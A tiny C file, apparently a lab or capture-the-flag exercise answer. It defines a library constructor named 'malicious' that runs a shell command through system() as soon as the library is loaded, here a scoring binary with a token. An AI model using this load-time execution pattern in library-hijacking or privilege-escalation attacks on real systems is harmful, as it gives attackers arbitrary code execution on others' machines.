#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 83727bda-34c8-46fa-af83-9b4f1a2f8360");
}
